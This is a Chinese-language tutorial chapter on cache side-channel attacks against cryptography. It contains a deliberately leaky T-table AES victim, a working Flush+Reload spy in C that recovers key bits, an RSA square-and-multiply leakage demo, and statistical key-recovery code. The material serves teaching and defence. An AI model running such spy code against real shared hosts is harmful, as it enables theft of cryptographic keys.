# Ch 11 — 打真實目標：cache 攻擊打 crypto

> **目標**：理解密碼學實作為何天生容易洩漏側信道、掌握 AES T-table 攻擊的完整推導流程、了解 RSA square-and-multiply 如何直接把私鑰 bit 串洩漏給旁觀者，並能用 F+R 寫出真正的 spy 程式驗證攻擊原理。

---

## 密鑰相依的記憶體存取：為什麼查表是災難

密碼學的最大敵人不是數學，是**實作**。一個算法在理論上無懈可擊，但只要 C 程式裡出現「用密鑰或密鑰衍生值當陣列 index」，cache 攻擊就有破口。

問題的核心用一句話說完：**不同的記憶體位址對應不同的 cache line；攻擊者如果能觀察哪條 cache line 被存取，他就知道你存取了哪個位址；如果那個位址跟密鑰有關，密鑰就洩漏了。**

### AES 的歷史算法

AES（Advanced Encryption Standard）的教科書演算法有四個步驟：

```
SubBytes  → 用 S-box 做 byte 替換（非線性混淆）
ShiftRows → 列位移
MixColumns→ 行混合（GF(2^8) 乘法）
AddRoundKey→ 和輪金鑰 XOR
```

在沒有硬體加速的時代，MixColumns + SubBytes 的組合計算量大。聰明的工程師把這些操作預算成查表：

```
// 四個 256-entry 的 32-bit table，各 1 KB
uint32_t T0[256], T1[256], T2[256], T3[256];

// AES 第一輪（簡化）
out[0] = T0[in[0] ^ key[0]]
       ^ T1[in[5] ^ key[5]]
       ^ T2[in[10] ^ key[10]]
       ^ T3[in[15] ^ key[15]];
```

T-table 把 SubBytes + MixColumns 壓縮成一次查表加三次 XOR，大幅加速。代價是：**查表的 index 直接包含 `plaintext[i] ^ key[i]`**。

### 洩漏機制的 ASCII 圖解

```
T0 table：256 個 uint32_t = 1024 bytes
每條 cache line 64 bytes = 16 個 uint32_t

T0 的 16 條 cache line：
  line  0: T0[0x00]  ~ T0[0x0F]   (offset  0 ~  63)
  line  1: T0[0x10]  ~ T0[0x1F]   (offset 64 ~ 127)
  ...
  line 15: T0[0xF0]  ~ T0[0xFF]   (offset 960 ~ 1023)

存取 T0[idx] 時，存取的是 line (idx >> 4)

攻擊者觀察 line L 被 hit：
  → idx >> 4 == L
  → (plaintext[0] ^ key[0]) >> 4 == L
  → 因為 plaintext[0] 已知
  → key[0] >> 4 == L ^ (plaintext[0] >> 4)   [高 4 bits]
  → 還差低 4 bits，需要更多 chosen plaintext
```

更精確說：cache line 64 bytes 可裝 16 個 32-bit entry，所以觀察一次 F+R 只能確定 `idx` 落在哪個 16-entry 的 group，也就是恢復 index 的**高 4 bits**（nibble）。但這已經把 key[0] 的搜尋空間從 256 壓到 16。

---

## AES T-table 查表的 cache line 洩漏：機制推導

### 洩漏的資訊量

每次 chosen plaintext 攻擊的流程：

1. 攻擊者選好 `p[0]`，送給 victim 加密
2. victim 執行 `T0[p[0] ^ k[0]]`，這條 T0 存取讓某條 cache line 進入 LLC
3. 攻擊者 reload T0 的 16 條 cache line，找出哪條 hit（< THRESHOLD）
4. 設命中的是 line `L`：`(p[0] ^ k[0]) >> 4 == L`
5. 已知 `p[0]`，推算 `k[0] >> 4 == L ^ (p[0] >> 4)`

單次觀察給出 `k[0]` 的高 nibble（4 bits），剩 16 種可能。

若再用 `p[0] = 0x01, 0x02, ...` 進行更多次攻擊，可以縮小到 low nibble。實際上：

- 固定 `k[0]`，改變 `p[0]` 的低 nibble → T0 存取不同的 offset，但同一條 line 內
- 改變 `p[0]` 的高 nibble → 跳到不同 line

用 16 種不同高 nibble 的 plaintext 各測一次，就能完全確定 `k[0]`（假設 cache 觀察無雜訊）。

### 信心分布

實際系統有雜訊（prefetcher、OS jitter、L1/L2 eviction）。正確做法是多次實驗，對每個 k[0] 候選值（0–255）統計「觀察與預測一致的次數」，取最高分：

```
score[c] = Σ_t  1{ observed_line(t) == expected_line(t, c) }
           t=0..N-1

k[0] = argmax_c score[c]
```

這是 Bernstein 2005 那篇論文的核心方法。

---

## 真跑：F+R 監控 T-table victim

### 程式架構

我們用共享記憶體（`/tmp/aes_shared_T0`，mmap 匿名映射的 shm_open）讓 victim 和 spy 共享同一份 T0。這是 F+R 的前提：兩個 process 必須 map 同一個實體頁。

**aes_victim.c**：

```c
/* aes_victim.c — 教學用 T-table AES victim
 * 編譯：gcc -O0 aes_victim.c -o aes_victim
 * 執行：taskset -c 2 ./aes_victim
 *
 * 警告：這是刻意洩漏的教學程式，實際加密請用 AES-NI。
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

/* T0 table：256 個 uint32_t，用巨集展開省行數
 * 攻擊只看哪個 cache line 被存取，table 的值不影響結果
 * 用 i*0x01010101 做佔位（確保每格非零且可識別）
 */
static uint32_t T0_const[256];
static void init_T0(void) {
    for (int i = 0; i < 256; i++)
        T0_const[i] = (uint32_t)(i * 0x01010101u + 0xa5000000u);
}

#define SHM_NAME "/aes_shared_T0"
#define T0_SIZE  (256 * sizeof(uint32_t))  /* 1024 bytes = 16 cache lines */

int main(int argc, char *argv[]) {
    /* 讀入 plaintext[0]，預設 0x00 */
    uint8_t p0 = 0x00;
    if (argc >= 2) p0 = (uint8_t)strtoul(argv[1], NULL, 16);

    /* hardcoded 教學 key，key[0] = 0x2b */
    uint8_t key[16] = {
        0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
        0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
    };

    /* 建立 / 開啟共享記憶體，讓 spy 可以 mmap 同一份 T0 */
    int fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0666);
    if (fd < 0) { perror("shm_open"); return 1; }
    ftruncate(fd, T0_SIZE);

    uint32_t *T0 = mmap(NULL, T0_SIZE,
                        PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, 0);
    if (T0 == MAP_FAILED) { perror("mmap"); return 1; }

    /* 初始化 T0 */
    init_T0();
    memcpy(T0, T0_const, T0_SIZE);

    printf("[victim] key[0]=0x%02x p[0]=0x%02x → T0 index=0x%02x → line %d\n",
           key[0], p0, p0 ^ key[0], (p0 ^ key[0]) >> 4);
    printf("[victim] 按 Enter 加密..."); getchar();

    /* 關鍵：T-table 查表，index = plaintext ^ key */
    volatile uint32_t result = T0[p0 ^ key[0]];
    (void)result;
    printf("[victim] 完成，T0[0x%02x] 已存取\n", p0 ^ key[0]);

    munmap(T0, T0_SIZE);
    close(fd);
    return 0;
}
```

**aes_spy.c**：

```c
/* aes_spy.c — F+R 監控 T0 table，推算 key[0] 高 nibble
 * 編譯：gcc -O0 aes_spy.c -o aes_spy -lrt
 * 執行：taskset -c 3 ./aes_spy [p0_hex]  （先啟動，後啟動 victim）
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define SHM_NAME  "/aes_shared_T0"
#define T0_SIZE   (256 * sizeof(uint32_t))
#define CL        64                        /* cache line bytes */
#define N_LINES   (T0_SIZE / CL)           /* 16 */
#define THRESHOLD 150

static inline uint64_t rdtsc(void) {
    uint32_t lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}
static inline void clflush(void *p) {
    __asm__ volatile ("clflush (%0)" :: "r"(p) : "memory");
}

int main(int argc, char *argv[]) {
    uint8_t p0 = (argc >= 2) ? (uint8_t)strtoul(argv[1], NULL, 16) : 0;

    int fd = -1;
    while (fd < 0) { fd = shm_open(SHM_NAME, O_RDONLY, 0666); usleep(50000); }
    uint32_t *T0 = mmap(NULL, T0_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    if (T0 == MAP_FAILED) { perror("mmap"); return 1; }

    /* Step 1: flush T0 的 16 條 cache line */
    for (int i = 0; i < N_LINES; i++)
        clflush((uint8_t *)T0 + i * CL);
    __asm__ volatile ("mfence" ::: "memory");

    printf("[spy] T0 flushed. 讓 victim 加密，完成後按 Enter...");
    getchar();

    /* Step 2: reload，找 hit line */
    int hit = -1;
    for (int i = 0; i < N_LINES; i++) {
        volatile uint32_t *ptr = (volatile uint32_t *)((uint8_t *)T0 + i * CL);
        uint64_t t0 = rdtsc();
        (void)*ptr;
        uint64_t t1 = rdtsc();
        int is_hit = (t1 - t0 < THRESHOLD);
        printf("  line %2d: %4llu cycles  %s\n",
               i, (unsigned long long)(t1-t0), is_hit ? "HIT" : "miss");
        if (is_hit) hit = i;
    }

    /* Step 3: 推算 key[0] 高 nibble */
    if (hit >= 0) {
        uint8_t k_hi = (uint8_t)(hit ^ (p0 >> 4));
        printf("\n[spy] hit line=%d → key[0] 高 nibble=0x%x"
               " → key[0] in [0x%02x, 0x%02x]\n",
               hit, k_hi, k_hi<<4, (k_hi<<4)|0xf);
        printf("[spy] 已知 key[0]=0x2b，高 nibble=0x%x  %s\n",
               0x2b>>4, (k_hi == (0x2b>>4)) ? "MATCH ✓" : "MISMATCH");
    } else {
        printf("[spy] 無明確 HIT（試著對齊時機或關閉 prefetcher）\n");
    }

    munmap(T0, T0_SIZE); close(fd); shm_unlink(SHM_NAME);
    return 0;
}
```

### 編譯與執行

```bash
# 終端 A（spy 先起）
gcc -O0 aes_spy.c -o aes_spy -lrt && taskset -c 3 ./aes_spy 0x00
# 終端 B（victim 後起）
gcc -O0 aes_victim.c -o aes_victim -lrt && taskset -c 2 ./aes_victim 0x00
# victim 按 Enter 加密後，spy 按 Enter reload
```

### 預期輸出（理論值，p[0]=0x00，key[0]=0x2b）

```
# victim
[victim] T0 index = 0x2b → 目標 cache line = 2

# spy（實際依雜訊而異）
  line  0:  238 cycles  miss
  line  1:  241 cycles  miss
  line  2:   31 cycles  HIT   ← T0[0x2b] 在 line 2
  line  3:  244 cycles  miss
  ...
  line 15:  239 cycles  miss

[spy] hit line=2 → key[0] 高 nibble=0x2 → key[0] in [0x20, 0x2f]
[spy] 已知 key[0]=0x2b，高 nibble=0x2  MATCH ✓
```

**誠實標記**：現代 OpenSSL 的 AES 在 x86 上優先使用 `AES-NI` 指令集（`AESENC`、`AESENCLAST`），完全在 CPU pipeline 內完成，**不存取任何查表記憶體**，這個攻擊打不到。即使沒有 AES-NI，OpenSSL 的 bitsliced AES 實作也是 constant-time。本程式是**刻意暴露漏洞的教學 victim**。防禦原則見 Ch 32。

---

## RSA square-and-multiply：分支洩漏私鑰指數

### 為什麼 RSA 私鑰操作會洩漏

RSA 解密需要計算 `m^d mod n`，其中 `d` 是私鑰指數。最直接的演算法是 square-and-multiply：

```
result = 1
for bit in bits_of_d (從最高位到最低位):
    result = square(result) mod n     # 每輪都做
    if bit == 1:
        result = multiply(result, m) mod n  # 只有 bit=1 才做
```

問題一眼可見：**`multiply` 只在 bit=1 時執行**。`multiply` 函數存取不同於 `square` 的記憶體位址（不同的 Montgomery 約簡用到的查表、或甚至只是不同的函數 code）。

用 F+R 監控 `multiply` 的 code page：
- 某輪：只看到 `square` 存取 → 這個 bit = 0
- 某輪：看到 `square` 和 `multiply` 都存取 → 這個 bit = 1

整個私鑰指數 `d` 就這樣一 bit 一 bit 地洩漏出來。

### 簡化示範：觀察 square vs multiply 的 cache 差異

```c
/* rsa_squaremul_demo.c — square-and-multiply 的分支可觀察性示範
 * 編譯：gcc -O0 rsa_squaremul_demo.c -o rsa_demo && ./rsa_demo
 */
#include <stdio.h>
#include <stdint.h>

/* noinline 確保兩個函數在不同的 cache line 上，攻擊者可以分別監控 */
__attribute__((noinline)) uint64_t do_square(uint64_t x) {
    volatile uint64_t t = x * x; return t % 0xFFFFFFC5ULL;
}
__attribute__((noinline)) uint64_t do_multiply(uint64_t x, uint64_t m) {
    volatile uint64_t t = x * m; return t % 0xFFFFFFC5ULL;
}

int main(void) {
    uint32_t d = 0xB5;   /* 私鑰 = 0b10110101 */
    uint64_t result = 1, m = 3;
    printf("d=0x%02x，攻擊者透過 F+R 觀察每輪呼叫模式：\n", d);
    for (int bit = 7; bit >= 0; bit--) {
        int b = (d >> bit) & 1;
        result = do_square(result);          /* 每輪必呼叫 */
        if (b) result = do_multiply(result, m);  /* 僅 bit=1 呼叫 */
        printf("  bit%d: square%s → infer d_bit=%d\n",
               bit, b ? "+multiply" : " only   ", b);
    }
    printf("攻擊者完整還原 d=0b10110101=0x%02x\n", d);
    return 0;
}
```

F+R 實作思路：對 `do_multiply` 所在的 code page 做 flush，每輪 victim 執行一個 bit 後 reload——reload < threshold 代表 `multiply` 被呼叫，d_bit = 1。
整個私鑰 `d` 一 bit 一 bit 還原：

```
bit7: square+multiply → d_bit=1
bit6: square only     → d_bit=0
bit5: square+multiply → d_bit=1
bit4: square+multiply → d_bit=1
bit3: square only     → d_bit=0
bit2: square+multiply → d_bit=1
bit1: square only     → d_bit=0
bit0: square+multiply → d_bit=1
攻擊者完整還原 d=0b10110101=0xB5
```

**誠實標記**：OpenSSL 的 RSA 在 1.0.0 之後就引入了 Montgomery ladder（固定時序的模冪），現代版本用 `BN_mod_exp_mont_consttime`，這個漏洞屬於 OpenSSL 0.9.x 時代。Yarom & Falkner 2014 論文打的是 GnuPG 舊版，現代 GnuPG 也已修補。

---

## 從存取樣式到 key：資訊論視角

### 每次觀察提供多少資訊

一次 chosen-plaintext + F+R 觀察：
- T0 有 16 條 cache line
- 觀察哪條被 hit = 從 256 種 key byte 縮減到 16 種
- 資訊量：log2(16) = 4 bits（恰好等於高 nibble）

理想情況下只需要少數幾次觀察就能完整恢復 key[0]：

| 觀察次數 | 候選數（無雜訊）  | 候選數（有雜訊）  |
|---------|----------------|----------------|
| 1       | 16             | 可能更多（false hit）|
| 2       | 1～4           | 10 左右         |
| 8       | 1              | 1～3            |
| 20+     | 1（高確定性）   | 1               |

### 多次攻擊的彙整方法

```c
/* 統計法：對每個候選 key byte 打分 */
int score[256] = {0};

for (int t = 0; t < N_TRIALS; t++) {
    uint8_t p0 = rand() & 0xFF;         /* 隨機選明文 */
    int observed_line = measure_hit_line(p0);  /* F+R 觀察 */

    /* 對每個候選 c，預測它應該 hit 哪條 line */
    for (int c = 0; c < 256; c++) {
        int predicted_line = (p0 ^ c) >> 4;
        if (predicted_line == observed_line)
            score[c]++;
    }
}

/* 取最高分的候選就是 key[0] */
int best = 0;
for (int c = 1; c < 256; c++)
    if (score[c] > score[best]) best = c;
printf("Recovered key[0] = 0x%02x\n", best);
```

核心：真正的 key[0] 與每次觀察 100% 一致；錯誤候選平均只有 1/16 的機率碰巧一致。N 次試驗後，真 key 的分數 ≈ N，假 key 分數 ≈ N/16，差距隨 N 拉大。

### 雜訊的來源

| 雜訊來源 | 緩解 |
|---------|------|
| Hardware prefetcher（帶入鄰近 line） | 多次試驗，只信「每次都 HIT」的 line |
| OS context switch（spy 被搶佔） | taskset + real-time priority |
| LLC eviction（第三方 process 污染） | 重複測量取 min latency |

---

## 誠實：現代實作的 constant-time 化

| 攻擊目標 | 歷史漏洞 | 現代狀態 |
|---------|---------|---------|
| AES T-table | Bernstein 2005 完整示範 | AES-NI 指令完全消除查表；OpenSSL `aes_core.c` bitsliced 實作也是 CT |
| OpenSSL AES-128 CBC | 在 Linux 上可重現 | 預設走 AES-NI，硬體層不留 timing 變化 |
| GnuPG RSA 私鑰操作 | Yarom & Falkner 2014 實際攻擊 | GnuPG 2.1+ 已 patch，使用 constant-time 模冪 |
| OpenSSL RSA | 0.9.x 時代漏洞 | `BN_mod_exp_mont_consttime` 替換了 naive 版本 |

「現代不能打了，為什麼還要學？」：嵌入式系統大量老版 mbedTLS 或自製 AES 仍用 T-table；每個新密碼庫上線前都要過「有無 key-dependent memory access」的審計；後量子密碼（CRYSTALS-Kyber、Dilithium）的早期實作也踩過相同地雷。防禦原則見 Ch 32。

---

## 對比與取捨

| 實作 | cache 可攻擊性 | 速度 | 部署難度 |
|-----|--------------|------|---------|
| AES T-table（原始） | 高：index = `p ^ k`，直接洩漏高 nibble | 快（L1/L2 cache hit 時） | 零（純 C） |
| AES bitsliced（pure SW） | 無：constant-time，無 key-dependent branch/load | 中等（SIMD 可加速） | 中（需 SIMD 優化） |
| AES-NI 指令集 | 無：硬體 pipeline 內完成，不存取記憶體 | 最快（1 cycle/block 量級） | 零（compiler 自動使用） |
| RSA square-and-multiply | 高：bit=0 vs bit=1 造成明顯存取差異 | 快（無冗餘 multiply） | 零（純 C） |
| RSA Montgomery ladder | 無：每輪都做 square AND multiply，只是順序不同 | 略慢（多一次 multiply） | 低（標準庫已內建） |
| RSA blinding（指數混淆） | 低：即使有 timing，洩漏的是 `d+r*φ(n)` 而非 `d` | 幾乎無損 | 低（隨機數生成開銷） |
| ECC scalar multiplication（ladder） | 無（正確實作）| 快 | 中 |

---

## 踩雷集錦

**坑一：clflush 對 read-only mmap 的行為**

spy 把 T0 mmap 成 `PROT_READ` 是沒問題的，`clflush` 不需要寫入權限（它只操作 cache，不改記憶體）。但如果 spy 試圖寫入 `PROT_READ` 的頁面，會收到 SIGSEGV。常見錯誤：用 `memset` 初始化 read-only 映射。

**坑二：victim 和 spy 必須 map 同一個實體頁**

F+R 成立的前提是兩個 process 的虛擬位址映射到同一個實體頁（透過 shm_open 的 `MAP_SHARED`）。如果 victim 用 `mmap(MAP_PRIVATE)` 或 `malloc`，spy 完全看不到那份記憶體，F+R 永遠 miss。

**坑三：prefetcher 污染結果**

Intel 的 L2 spatial prefetcher 傾向於把同一個 page 內鄰近的 cache line 一起帶進 L2。如果 victim 只存取 T0[0x2b]（line 2），prefetcher 可能同時把 line 1、3 帶進來，spy 看到多條 HIT。解法：重複實驗，只信「每次都 HIT」的 line；或在 BIOS 關閉 prefetcher（但 kernel 跑不起來的話反而麻煩）。

**坑四：taskset 兩個 process 到同一個 core 會互相搶佔**

spy 和 victim 應該跑在**不同的核心**（如 taskset -c 2 victim，taskset -c 3 spy），利用共用 LLC。如果跑同一個核心，context switch 讓 spy 的 flush 被 victim 自己的 L1/L2 refill 污染。

**坑五：time window 太窄**

spy flush → victim 執行 → spy reload 之間必須確保 victim 的存取已發生但 LLC eviction 還沒清掉 hit。用 `getchar()` 同步是教學做法，真實攻擊要用 busy loop + shared flag 同步，確保 time window < 幾十 ms。

---

## 進階：再往深一層

- **完整 Bernstein 攻擊**：用統計相關性分析多個 plaintext 下 T0 的 access count，約 2^20 次加密後完整恢復 128-bit 金鑰，不需要精確的 cache line 觀察
- **多 table 攻擊**：AES 用 T0–T3 四表，每 table 洩漏不同 byte；完整攻擊同時監控 64 條 cache line
- **無共享記憶體版**：LLC set-associativity 讓 Evict+Time / Prime+Probe 不需要 shm 即可監控 AES（見 Ch 8）

---

## 動手練習

1. 修改 `aes_victim.c`，讓 victim 接受命令列輸入的 plaintext（16 進位），並修改 spy 同步讀取。用 8 種不同 `p[0]` 的高 nibble（0x00, 0x10, 0x20, ..., 0x70）做 8 次攻擊，驗證每次觀察到的 hit line 都和 `(p0 ^ 0x2b) >> 4` 吻合。

2. 在 `aes_spy.c` 加入 `score[256]` 統計，跑 32 次隨機 plaintext，用最終分數自動輸出 `Recovered key[0] = 0x??`，和 victim 的 hardcoded key[0] = 0x2b 對比。

3. 實作 `rsa_spy.c`：對 `do_multiply` 的 code page（用 `/proc/self/maps` 找位址）做 F+R，監控 `rsa_squaremul_demo.c` 的每一輪，印出「bit 幾：觀察到 multiply」，最後對比 d_private = 0xB5。

---

## 本章重點整理

- AES T-table 實作的致命問題：查表的 index `= p[i] ^ k[i]`，直接把 key 和 plaintext 的 XOR 當成記憶體存取位址，讓攻擊者可從 cache line 觀察推算 key
- 一次 F+R 觀察 T0 的哪條 line 被 hit，可以恢復 key byte 的高 4 bits（nibble），搜尋空間從 256 縮到 16
- RSA square-and-multiply 的問題是**條件分支**：只有指數 bit=1 的輪才呼叫 multiply，攻擊者直接透過 F+R 還原每個 bit
- 統計法（多次 chosen plaintext + 打分）可以在有雜訊的環境下正確恢復 key byte
- 現代防禦：AES-NI 指令消除查表、constant-time bitsliced AES、Montgomery ladder、RSA blinding；防禦詳見 Ch 32

---

## 自我檢核

1. AES T-table 的 cache line 洩漏和 64 bytes 的 cache line 大小有什麼直接關係？為什麼是 16 條而不是 256 條？
2. 如果 victim 執行的不是 T0[p ^ k] 而是 T0[p ^ k ^ constant]，spy 觀察到的 hit line 會怎麼變？攻擊是否還能成功？
3. RSA Montgomery ladder 為什麼能防禦 square-and-multiply 攻擊？它的「每輪都做兩次運算」是否有邊際情況（corner case）會洩漏？
4. 在 `score[]` 統計法中，如果 hardware prefetcher 讓相鄰的 cache line 也被 hit，對 score 的分布有什麼影響？需要調整演算法嗎？
5. 為什麼 spy 和 victim 必須共享同一份 T0 的實體頁面，而不能各自 malloc 一份 T0？

---

## 延伸閱讀

1. **D.J. Bernstein, "Cache-timing attacks on AES", 2005**
   — AES T-table 攻擊的原始完整分析，推導出用 timing 相關性（不需要 cache line 精確觀察）還原金鑰的統計方法。是整個「crypto cache side channel」領域的奠基之作。
   https://cr.yp.to/antiforgery/cachetiming-20050414.pdf

2. **D.A. Osvik, A. Shamir, E. Tromer, "Cache Attacks and Countermeasures: the Case of AES", CT-RSA 2006**
   — 系統化分類 Evict+Time 和 Prime+Probe 兩類攻擊手法，並在真實 Linux 上用 Prime+Probe 示範 AES 金鑰恢復，同時給出最早的 cache-oblivious 防禦分類。AES cache 攻擊的必讀文獻。
   https://eprint.iacr.org/2005/271.pdf

3. **Y. Yarom, K. Falkner, "FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack", USENIX Security 2014**
   — F+R 攻擊的定義論文，示範對 GnuPG 1.4.13 的 RSA 私鑰恢復（單次解密即可），確立了 LLC 共享 + clflush 的攻擊範式，直接影響後來的 Spectre/Meltdown 攻擊原語。
   https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-yarom.pdf

---

→ [下一章：跨核心/跨 VM 的 LLC 攻擊](12-cross-core-cross-vm-llc.md)
